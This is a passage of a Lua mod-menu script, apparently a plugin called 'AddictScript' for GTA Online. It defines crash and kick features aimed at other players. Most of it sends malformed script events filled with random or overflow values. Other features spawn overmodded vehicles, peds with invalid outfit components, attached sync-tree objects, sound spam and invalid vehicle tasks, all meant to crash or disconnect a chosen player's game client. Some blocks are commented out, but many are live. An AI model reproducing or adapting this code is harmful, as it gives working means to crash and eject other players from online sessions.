		script.trigger_script_event(962740265, pid, {pid, math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
		system.wait(1)
		script.trigger_script_event(296518236, pid, {player.player_id(), pid, pid, pid, 1})
		system.wait(1)
		script.trigger_script_event(-1782442696, pid, {player.player_id(), 420, 69})
		system.wait(1)
		for i = 1, 5 do
			script.trigger_script_event(-1782442696, pid, {player.player_id(), math.random(-2147483647, 2147483647), 0})
			system.wait(1)
		end
		script.trigger_script_event(924535804, pid, {pid, math.random(-2147483647, 2147483647), 0})
		system.wait(1)
		script.trigger_script_event(436475575, pid, {pid, math.random(-2147483647, 2147483647), 0})
		system.wait(1)
		menu.notify("Yo Momma Crash executed successfully.", AddictScript)
	else
		menu.notify("Invalid Player.", AddictScript, 3, 211)
	end
end)

menu.add_player_feature("Crash - Script Event", "action_value_str", playerparents["Player Crashes"], function(f, pid)
	if player.is_player_valid(pid) then
		if f.value == 0 then
			script.trigger_script_event(-904555865, pid, {player.player_id(), pid, math.random(-2147483647, 2147483647), pid})
		elseif f.value == 1 then
			script.trigger_script_event(-904555865, pid, {player.player_id(), pid, 1001, pid})
		elseif f.value == 2 then
			script.trigger_script_event(-904555865, pid, {player.player_id(), pid, math.random(-2147483647, 2147483647), pid})
		elseif f.value == 3 then
			script.trigger_script_event(-904555865, pid, {player.player_id(), 2147483647, 2147483647, 232342, 112, 238452, 2832})
		elseif f.value == 4 then
			script.trigger_script_event(-904555865, pid, {player.player_id(), math.random(-1986324736, 1747413822), math.random(-1986324736, 1777712108), math.random(-1673857408, 1780088064), math.random(-2588888790, 2100146067)})
		elseif f.value == 5 then
			script.trigger_script_event(-904555865, pid, {player.player_id(), pid, math.random(-2147483647, 2147483647), pid})
		elseif f.value == 6 then
			script.trigger_script_event(-904555865, pid, {player.player_id(), pid, 1001, pid})
		elseif f.value == 7 then
			script.trigger_script_event(-904555865, pid, {player.player_id(), pid, math.random(-2147483647, 2147483647), pid})
		elseif f.value == 8 then
			script.trigger_script_event(-904555865, pid, {player.player_id(), pid, 1001, pid})
		elseif f.value == 9 then
			script.trigger_script_event(-904555865, pid, {player.player_id(), 20})
		elseif f.value == 10 then
			script.trigger_script_event(-904555865, pid, {player.player_id(), 62, 2})
		elseif f.value == 11 then
			script.trigger_script_event(-904555865, pid, {player.player_id(), 3})
		elseif f.value == 12 then
			script.trigger_script_event(-904555865, pid, {player.player_id(), pid, 111})
		elseif f.value == 13 then
			script.trigger_script_event(-904555865, pid, {player.player_id(), 0})
		elseif f.value == 14 then
			script.trigger_script_event(-904555865, pid, {player.player_id(), 0})
		elseif f.value == 15 then
			script.trigger_script_event(-904555865, pid, {player.player_id(), 0})
		elseif f.value == 16 then
			script.trigger_script_event(-904555865, pid, {player.player_id(), 0})
		elseif f.value == 17 then
			script.trigger_script_event(-904555865, pid, {player.player_id(), 0})
		elseif f.value == 18 then
			script.trigger_script_event(-904555865, pid, {player.player_id(), 420, 69})
		elseif f.value == 19 then
			script.trigger_script_event(-904555865, pid, {player.player_id(), 28, 4294967295, 4294967295})
		elseif f.value == 20 then
			script.trigger_script_event(1775863255, pid, {player.player_id(), 4294894682, -4294904289, -4294908269, 4294955284, 4294940300, -4294933898})
		elseif f.value == 21 then
			script.trigger_script_event(1775863255, pid, {player.player_id(), 4294894682, -4294904289, -4294908269, 4294955284, 4294940300, -4294933898})
		elseif f.value == 22 then
			script.trigger_script_event(-1501164935, pid, {player.player_id(), pid, math.random(-2147483647, 2147483647), pid})
		elseif f.value == 23 then
			script.trigger_script_event(-1501164935, pid, {player.player_id(), pid, 1001, pid})
		elseif f.value == 24 then
			script.trigger_script_event(-904555865, pid, {math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
		elseif f.value == 25 then
			script.trigger_script_event(-904555865, pid, {math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
		elseif f.value == 26 then
			script.trigger_script_event(1775863255, pid, {math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
		elseif f.value == 27 then
			script.trigger_script_event(1775863255, pid, {math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
		elseif f.value == 28 then
			script.trigger_script_event(1775863255, pid, {math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
		elseif f.value == 29 then
			script.trigger_script_event(1775863255, pid, {player.player_id(), pid, 1001, pid})
		elseif f.value == 30 then
			script.trigger_script_event(-1775863255, pid, {player.player_id(), math.random(-2147483647, 2147483647), pid})
		elseif f.value == 31 then
			script.trigger_script_event(1775863255, pid, {player.player_id(), 4113865})
		elseif f.value == 32 then
			script.trigger_script_event(-1775863255, pid, {player.player_id(), 20923579})
		elseif f.value == 33 then
			script.trigger_script_event(1775863255, pid, {77777778})
		elseif f.value == 34 then
			script.trigger_script_event(1775863255, pid, {player.player_id(), pid, math.random(-2147483647, 2147483647), pid})
		elseif f.value == 35 then
			script.trigger_script_event(1775863255, pid, {player.player_id(), pid, math.random(-2147483647, 2147483647), 136236, math.random(-5262, 216247), math.random(-2147483647, 2147483647), math.random(-2623647, 2143247), 1587193, math.random(-214626647, 21475247), math.random(-2123647, 2363647), 651264, math.random(-13683647, 2323647), 1951923, math.random(-2147483647, 2147483647), math.random(-2136247, 21627), 2359273, math.random(-214732, 21623647), pid})
		end
		menu.notify("Script Event Crash executed successfully.", AddictScript)
	else
		menu.notify("Invalid Player.", AddictScript, 3, 211)
	end
end):set_str_data({
	"v1",
	"v2",
	"v3",
	"v4",
	"v5",
	"v6",
	"v7",
	"v8",
	"v9",
	"v10",
	"v11",
	"v12",
	"v13",
	"v14",
	"v15",
	"v16",
	"v17",
	"v18",
	"v19",
	"v20",
	"v21",
	"v22",
	"v23",
	"v24",
	"v25",
	"v26",
	"v27",
	"v28",
	"v29",
	"v30",
	"v31",
	"v32",
	"v33",
	"v34",
	"v35",
	"v36"
})


menu.add_player_feature("Crash - Bad Outfit Component", "toggle", playerparents["Player Crashes"], function(f, pid)
	if player.is_player_valid(pid) then
		if network.get_player_player_is_spectating(player.player_id()) == pid or utilities.get_distance_between(player.get_player_ped(player.player_id()), player.get_player_ped(pid)) < 100 then
			utilities.request_model(0x705E61F2)
			local ped_ = ped.create_ped(1, 0x705E61F2, player.get_player_coords(pid), 0, true, false)
			network.request_control_of_entity(ped_)
			ped.set_ped_component_variation(ped_, 0, 45, 0, 0)
			ped.set_ped_component_variation(ped_, 1, 197, 0, 0)
			ped.set_ped_component_variation(ped_, 2, 76, 0, 0)
			ped.set_ped_component_variation(ped_, 3, 196, 0, 0)
			ped.set_ped_component_variation(ped_, 4, 144, 0, 0)
			ped.set_ped_component_variation(ped_, 5, 99, 0, 0)
			ped.set_ped_component_variation(ped_, 6, 102, 0, 0)
			ped.set_ped_component_variation(ped_, 7, 151, 0, 0)
			ped.set_ped_component_variation(ped_, 8, 189, 0, 0)
			ped.set_ped_component_variation(ped_, 9, 56, 0, 0)
			ped.set_ped_component_variation(ped_, 10, 132, 0, 0)
			ped.set_ped_component_variation(ped_, 11, 393, 0, 0)
			system.wait(2000)
			utilities.request_control_silent(ped_)
			utilities.hard_remove_entity(ped_)
			menu.notify("Bad Outfit Component Crash executed successfully.", AddictScript)
		else
			menu.notify("You have to spectate the target or be near them in order for this feature to work.", AddictScript, 5, 211)
		end
	else
		menu.notify("Invalid Player.", AddictScript, 3, 211)
	end
end)
]]
menu.add_player_feature("Crash - Invalid Vehicle Task", "toggle", playerparents["Player Crashes"], function(f, pid)
    if player.is_player_valid(pid) then
		utilities.request_control_silent(player.get_player_vehicle(pid))
		for i = 1, 3 do
			natives.TASK_VEHICLE_TEMP_ACTION(player.get_player_ped(pid), player.get_player_vehicle(pid), 15, 10)
			natives.TASK_VEHICLE_TEMP_ACTION(player.get_player_ped(pid), player.get_player_vehicle(pid), 16, 10)
			natives.TASK_VEHICLE_TEMP_ACTION(player.get_player_ped(pid), player.get_player_vehicle(pid), 18, 10)
		end
		system.wait(1000)
		for i = 1, 3 do
			natives.TASK_VEHICLE_TEMP_ACTION(player.get_player_ped(pid), player.get_player_vehicle(pid), 15, 10)
			natives.TASK_VEHICLE_TEMP_ACTION(player.get_player_ped(pid), player.get_player_vehicle(pid), 16, 10)
			natives.TASK_VEHICLE_TEMP_ACTION(player.get_player_ped(pid), player.get_player_vehicle(pid), 18, 10)
		end
		system.wait(1000)
		for i = 1, 3 do
			natives.TASK_VEHICLE_TEMP_ACTION(player.get_player_ped(pid), player.get_player_vehicle(pid), 15, 10)
			natives.TASK_VEHICLE_TEMP_ACTION(player.get_player_ped(pid), player.get_player_vehicle(pid), 16, 10)
			natives.TASK_VEHICLE_TEMP_ACTION(player.get_player_ped(pid), player.get_player_vehicle(pid), 18, 10)
		end
        menu.notify("Invalid Vehicle Task Crash executed successfully.", AddictScript)
    else
        menu.notify("Invalid Player.", AddictScript, 3, 211)
    end
end)

menu.add_player_feature("Crash - Sound Spam", "action_value_str", playerparents["Player Crashes"], function(f, pid)
	if player.is_player_valid(pid) then
		local time = utils.time_ms() + 100
		while time > utils.time_ms() do
			for i = 1, 10 do
				if f.value == 0 then
					audio.play_sound_from_coord(-1, "Object_Dropped_Remote", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
				elseif f.value == 1 then
					audio.play_sound_from_coord(-1, "Event_Message_Purple", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
				elseif f.value == 2 then
					audio.play_sound_from_coord(-1, "Checkpoint_Cash_Hit", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
				elseif f.value == 3 then
					audio.play_sound_from_coord(-1, "Event_Start_Text", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
				elseif f.value == 4 then
					audio.play_sound_from_coord(-1, "Checkpoint_Hit", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
				elseif f.value == 5 then
					audio.play_sound_from_coord(-1, "Return_To_Vehicle_Timer", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
				elseif f.value == 6 then
					audio.play_sound_from_coord(-1, "5s", player.get_player_coords(pid), "MP_MISSION_COUNTDOWN_SOUNDSET", true, 1, false)
				elseif f.value == 7 then
					audio.play_sound_from_coord(-1, "10s", player.get_player_coords(pid), "MP_MISSION_COUNTDOWN_SOUNDSET", true, 1, false)
				end
			end
			system.wait(0)
		end
		menu.notify("Sound Spam Crash executed successfully.", AddictScript)
	else
		menu.notify("Invalid Player.", AddictScript, 3, 211)
	end
end):set_str_data({
	"1 v1",
	"1 v2",
	"1 v3",
	"1 v4",
	"1 v5",
	"1 v6",
	"2 v1",
	"2 v2"
})

menu.add_player_feature("Crash - Bad Vehicle Modification", "toggle", playerparents["Player Crashes"], function(f, pid)
    if player.is_player_valid(pid) then
		if network.get_player_player_is_spectating(player.player_id()) == pid or utilities.get_distance_between(player.get_player_ped(player.player_id()), player.get_player_ped(pid)) < 100 then
			utilities.request_model(1492612435)
			utilities.request_model(3517794615)
			utilities.request_model(3889340782)
			utilities.request_model(3253274834)
			local vehicle_1 = vehicle.create_vehicle(1492612435, player.get_player_coords(pid), math.random(0, 360), true, false)
			local vehicle_2 = vehicle.create_vehicle(3517794615, player.get_player_coords(pid), math.random(0, 360), true, false)
			local vehicle_3 = vehicle.create_vehicle(3889340782, player.get_player_coords(pid), math.random(0, 360), true, false)
			local vehicle_4 = vehicle.create_vehicle(3253274834, player.get_player_coords(pid), math.random(0, 360), true, false)
			network.request_control_of_entity(vehicle_1)
			network.request_control_of_entity(vehicle_2)
			network.request_control_of_entity(vehicle_3)
			network.request_control_of_entity(vehicle_4)
			vehicle.set_vehicle_mod_kit_type(vehicle_1, 0)
			vehicle.set_vehicle_mod_kit_type(vehicle_2, 0)
			vehicle.set_vehicle_mod_kit_type(vehicle_3, 0)
			vehicle.set_vehicle_mod_kit_type(vehicle_4, 0)
			for i = 0, 49 do
				local mod = vehicle.get_num_vehicle_mods(vehicle_1, i) - 1
				vehicle.set_vehicle_mod(vehicle_1, i, mod, true)
				vehicle.toggle_vehicle_mod(vehicle_1, mod, true)
				local mod = vehicle.get_num_vehicle_mods(vehicle_2, i) - 1
				vehicle.set_vehicle_mod(vehicle_2, i, mod, true)
				vehicle.toggle_vehicle_mod(vehicle_2, mod, true)
				local mod = vehicle.get_num_vehicle_mods(vehicle_3, i) - 1
				vehicle.set_vehicle_mod(vehicle_3, i, mod, true)
				vehicle.toggle_vehicle_mod(vehicle_3, mod, true)
				local mod = vehicle.get_num_vehicle_mods(vehicle_4, i) - 1
				vehicle.set_vehicle_mod(vehicle_4, i, mod, true)
				vehicle.toggle_vehicle_mod(vehicle_4, mod, true)
			end
			for j = 0, 20 do
				if vehicle.does_extra_exist(vehicle_1, j) then
					vehicle.set_vehicle_extra(vehicle_1, j, true)
				end
				if vehicle.does_extra_exist(vehicle_2, j) then
					vehicle.set_vehicle_extra(vehicle_2, j, true)
				end
				if vehicle.does_extra_exist(vehicle_3, j) then
					vehicle.set_vehicle_extra(vehicle_3, j, true)
				end
				if vehicle.does_extra_exist(vehicle_4, j) then
					vehicle.set_vehicle_extra(vehicle_4, j, true)
				end
			end
			vehicle.set_vehicle_bulletproof_tires(vehicle_1, true)
			vehicle.set_vehicle_bulletproof_tires(vehicle_2, true)
			vehicle.set_vehicle_bulletproof_tires(vehicle_3, true)
			vehicle.set_vehicle_bulletproof_tires(vehicle_4, true)
			vehicle.set_vehicle_window_tint(vehicle_1, 1)
			vehicle.set_vehicle_window_tint(vehicle_2, 1)
			vehicle.set_vehicle_window_tint(vehicle_3, 1)
			vehicle.set_vehicle_window_tint(vehicle_4, 1)
			vehicle.set_vehicle_number_plate_index(vehicle_1, 1)
			vehicle.set_vehicle_number_plate_index(vehicle_2, 1)
			vehicle.set_vehicle_number_plate_index(vehicle_3, 1)
			vehicle.set_vehicle_number_plate_index(vehicle_4, 1)
			vehicle.set_vehicle_number_plate_text(vehicle_1, " ")
			vehicle.set_vehicle_number_plate_text(vehicle_2, " ")
			vehicle.set_vehicle_number_plate_text(vehicle_3, " ")
			vehicle.set_vehicle_number_plate_text(vehicle_4, " ")
			local time = utils.time_ms() + 500
			while time > utils.time_ms() do
				system.yield(0)
				network.request_control_of_entity(vehicle_1)
				network.request_control_of_entity(vehicle_2)
				network.request_control_of_entity(vehicle_3)
				network.request_control_of_entity(vehicle_4)
				entity.set_entity_coords_no_offset(vehicle_1, player.get_player_coords(pid))
				entity.set_entity_coords_no_offset(vehicle_2, player.get_player_coords(pid))
				entity.set_entity_coords_no_offset(vehicle_3, player.get_player_coords(pid))
				entity.set_entity_coords_no_offset(vehicle_4, player.get_player_coords(pid))
			end
			system.wait(4000)
			utilities.request_control_silent(vehicle_1)
			utilities.request_control_silent(vehicle_2)
			utilities.request_control_silent(vehicle_3)
			utilities.request_control_silent(vehicle_4)
			utilities.hard_remove_entity(vehicle_1)
			utilities.hard_remove_entity(vehicle_2)
			utilities.hard_remove_entity(vehicle_3)
			utilities.hard_remove_entity(vehicle_4)
			menu.notify("Bad Vehicle Modification Crash executed successfully.", AddictScript)
		else
			menu.notify("You have to spectate the target or be near them in order for this feature to work.", AddictScript, 5, 211)
		end
    else
        menu.notify("Invalid Player.", AddictScript, 3, 211)
    end
end)

menu.add_player_feature("Crash - Bad Sync Tree", "toggle", playerparents["Player Crashes"], function(f, pid)
	if player.is_player_valid(pid) then
		utilities.request_model(1352295901)
		local sync_tree_children_hashes = {849958566, -568220328, 2155335200, 1272323782, 1296557055, 29828513, 2250084685, 2349112599, 1599985244, 3523942264, 3457195100, 3762929870, 1016189997, 861098586, 3613262246, 3245733464, 2494305715, 671173206, 3769155529, 978689073, 100436592, 3107991431, 1327834842, 1239708330}
		local sync_tree_children = {}
		local main_sync_handler = object.create_world_object(1352295901, player.get_player_coords(pid) + v3(300, 300, 300), true, false)
		network.request_control_of_entity(main_sync_handler)
		for i = 1, #sync_tree_children_hashes do
			utilities.request_model(sync_tree_children_hashes[i])
			sync_tree_children[i] = object.create_world_object(sync_tree_children_hashes[i], player.get_player_coords(pid) + v3(300, 300, 300), true, false)
			network.request_control_of_entity(sync_tree_children[i])
			entity.attach_entity_to_entity(sync_tree_children[i], main_sync_handler, 0, v3(0, 0, 0), v3(0, 0, 0), true, true, false, 0, false)
		end
		local time = utils.time_ms() + 2000
		while time > utils.time_ms() do
			system.yield(math.random(0, 10))
			entity.set_entity_coords_no_offset(main_sync_handler, v3(player.get_player_coords(pid).x + math.random(-1, 1), player.get_player_coords(pid).y + math.random(-1, 1), player.get_player_coords(pid).z + math.random(-1, 1)))
		end
		network.request_control_of_entity(main_sync_handler)
		utilities.hard_remove_entity(main_sync_handler)
		for i = 1, #sync_tree_children do
			if entity.is_an_entity(sync_tree_children[i]) then
				utilities.request_control_silent(sync_tree_children[i])
				utilities.hard_remove_entity(sync_tree_children[i])
			end
		end
		menu.notify("Bad Sync Tree Crash executed successfully.", AddictScript)
	else
		menu.notify("Invalid Player.", AddictScript, 3, 211)
	end
end)

aio_crash = menu.add_player_feature("AIO-Crash", "toggle", playerparents["Player Crashes"], function(f, pid)
mypos = player.get_player_coords(player.player_id())
pedmy = player.get_player_ped(player.player_id())
entity.set_entity_coords_no_offset(pedmy, v3(0,0,4000))
entity.freeze_entity(pedmy, true)
for i = 0 ,1 do
fakecrash(pid)
poolcrashplayer(pid)
invalidmodelcrashplayer(pid)
soundcrashplayer(pid)
attachcrashplayer(pid)
--secrashplayer(pid)--
end
entity.set_entity_coords_no_offset(pedmy, mypos)
entity.freeze_entity(pedmy, false)
end)

--[[
menu.add_player_feature("SE crash" , "toggle", playerparents["Player Crashes"], function(f, pid)
    script.trigger_script_event(-393294520, pid, {pid, math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
    script.trigger_script_event(-1386010354, pid, {pid, math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
    script.trigger_script_event(962740265, pid, {pid, math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
end)
]]

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

playerparents["Kicks"] = menu.add_player_feature("Kicks", "parent", playerparents["Crashes And Kicks"]).id
--[[
menu.add_player_feature("Kick - Phantom X", "action", playerparents["Kicks"], function(f, pid)
	if player.is_player_valid(pid) then
		script.trigger_script_event(1189947075, pid, {player.player_id(), 1204112514})
		menu.notify("Phantom X Kick executed successfully.", AddictScript)
	else
		menu.notify("Invalid Player.", AddictScript, 3, 211)
	end
end)

menu.add_player_feature("Kick - Stand Non Host", "action", playerparents["Kicks"], function(f, pid)
    if player.is_player_valid(pid) then
		script.trigger_script_event(-371781708, pid, {player.player_id(), pid, pid, 1403904671})
		script.trigger_script_event(-317318371, pid, {player.player_id(), pid, pid, 1993236673})
		script.trigger_script_event(911179316, pid, {player.player_id(), pid, pid, pid, 1234567990, pid, pid})
		script.trigger_script_event(846342319, pid, {player.player_id(), 578162304, 1})
		script.trigger_script_event(-2085853000, pid, {player.player_id(), pid, 1610781286, pid, pid})
		script.trigger_script_event(-1991317864, pid, {player.player_id(), 3, 935764694, pid, pid})
		script.trigger_script_event(-1970125962, pid, {player.player_id(), pid, 1171952288})
		script.trigger_script_event(-1013679841, pid, {player.player_id(), pid, 2135167326, pid})
		script.trigger_script_event(-1767058336, pid, {player.player_id(), 1459620687})
		script.trigger_script_event(-1892343528, pid, {player.player_id(), pid, math.random(-2147483647, 2147483647)})
		script.trigger_script_event(1494472464, pid, {player.player_id(), pid, math.random(-2147483647, 2147483647)})
		script.trigger_script_event(69874647, pid, {player.player_id(), pid, math.random(-2147483647, 2147483647)})
		script.trigger_script_event(998716537, pid, {player.player_id(), pid, math.random(-2147483647, 2147483647)})
		script.trigger_script_event(522189882, pid, {player.player_id(), pid, math.random(-2147483647, 2147483647)})
		script.trigger_script_event(1514515570, pid, {player.player_id(), pid, 2147483647})
		script.trigger_script_event(296518236, pid, {player.player_id(), pid, pid, pid, 1})
		script.trigger_script_event(-1782442696, pid, {player.player_id(), 420, 69})
		for i = 1, 5 do
			script.trigger_script_event(-1782442696, pid, {player.player_id(), math.random(-2147483647, 2147483647), 0})
		end
		script.trigger_script_event(924535804, pid, {player.player_id(), math.random(-2147483647, 2147483647), 0})
		script.trigger_script_event(436475575, pid, {player.player_id(), math.random(-2147483647, 2147483647), 0})
        menu.notify("Stand Non Host Kick executed successfully.", AddictScript)
    else
        menu.notify("Invalid Player.", AddictScript, 3, 211)
    end
end)

menu.add_player_feature("Kick - Ped Component 2 Desync", "action", playerparents["Kicks"], function(f, pid)
	if player.is_player_valid(pid) then
		if network.get_player_player_is_spectating(player.player_id()) == pid or utilities.get_distance_between(player.get_player_ped(player.player_id()), player.get_player_ped(pid)) < 100 then
			utilities.request_model(0x50262DB9)
			local ped_ = ped.create_ped(1, 0x50262DB9, player.get_player_coords(pid), 0, true, false)
			network.request_control_of_entity(ped_)
			ped.set_ped_ragdoll_blocking_flags(ped_, 1)
			ped.set_ped_combat_ability(ped_, 2)
			ped.set_ped_combat_attributes(ped_, 5, true)
			ped.set_ped_component_variation(ped_, 0, 0, 0, 39, 0)
			ped.set_ped_component_variation(ped_, 1, 104, 25, -1, 0)
			ped.set_ped_component_variation(ped_, 2, 49, 0, -1, 0)
			ped.set_ped_component_variation(ped_, 3, 33, 0, 0)
			ped.set_ped_component_variation(ped_, 4, 84, 0, 0)
			ped.set_ped_component_variation(ped_, 5, 82, 0, 0)
			ped.set_ped_component_variation(ped_, 6, 33, 0, 0)
			ped.set_ped_component_variation(ped_, 7, 0, 0, 0)
			ped.set_ped_component_variation(ped_, 8, 97, 0, 0)
			ped.set_ped_component_variation(ped_, 9, 0, 0, 0)
			ped.set_ped_component_variation(ped_, 10, 0, 0, 0)
			ped.set_ped_component_variation(ped_, 11, 186, 0, 0)
			ped.set_ped_prop_index(ped_, 0, 39, 0)
			ped.set_ped_prop_index(ped_, 1, -1, 0)
			ped.set_ped_prop_index(ped_, 2, -1, 0)
			ped.set_ped_head_blend_data(ped_, 0, 0, 0, 0, 0, 0, 0, 0, 0)
			system.wait(3000)
			script.trigger_script_event(-227800145, pid, {pid, math.random(32, 23647483647), math.random(-23647, 212347), 1, 115, math.random(-2321647, 21182412647), math.random(-2147483647, 2147483647), 26249, math.random(-1257483647, 23683647), 2623, 25136})
			utilities.request_control_silent(ped_)
			entity.delete_entity(ped_)
			menu.notify("Ped Component 2 Desync executed successfully.", AddictScript)
		else
			menu.notify("You have to spectate the target or be near them in order for this feature to work.", AddictScript, 5, 211)
		end
	else
		menu.notify("Invalid Player.", AddictScript, 3, 211)
	end
end)

menu.add_player_feature("Kick - Network Bail", "action_value_str", playerparents["Kicks"], function(f, pid)
	if player.is_player_valid(pid) then
		if f.value == 0 then
			script.trigger_script_event(915462795, pid, {player.player_id(), script_func.get_global_main(pid)})
		elseif f.value == 1 then
			script.trigger_script_event(915462795, pid, {player.player_id(), script_func.get_global_main(pid)})
		elseif f.value == 2 then
			script.trigger_script_event(915462795, pid, {player.player_id(), pid, math.random(-2147483647, 2147483647), pid})
		elseif f.value == 3 then
			script.trigger_script_event(915462795, pid, {player.player_id(), pid, math.random(-2147483647, 2147483647), pid})
		end
		menu.notify("Network Bail Kick executed successfully.", AddictScript)
	else
		menu.notify("Invalid Player.", AddictScript, 3, 211)
	end
end):set_str_data({
	"v1",
	"v2",
	"v3",
	"v4"
})
]]
menu.add_player_feature("Kick - Invalid Apartment Invite", "action_value_str", playerparents["Kicks"], function(f, pid)
	if player.is_player_valid(pid) then
		if f.value == 0 then
			script.trigger_script_event(0xF5F36157, pid, {player.player_id(), math.random(32, 2147483647), math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
		elseif f.value == 1 then
			script.trigger_script_event(0xF5F36157, pid, {player.player_id(), math.random(-2147483647, -1), math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
		end
		menu.notify("Invalid Apartment Invite Kick executed successfully.", AddictScript)
	else
		menu.notify("Invalid Player.", AddictScript, 3, 211)
	end
end):set_str_data({
	"v1",
	"v2"
})

local MyId = player.player_id
local getPed = player.get_player_ped
local function own_ped()
    return getPed(MyId())
end
--[[
menu.add_player_feature("Kick - Script Event", "action_value_str", playerparents["Kicks"], function(f, pid)
	if player.is_player_valid(pid) then
		if f.value == 0 then
			script.trigger_script_event(0x493FC6BB, pid, {player.player_id(), script_func.get_global_main(pid), pid})
		elseif f.value == 1 then
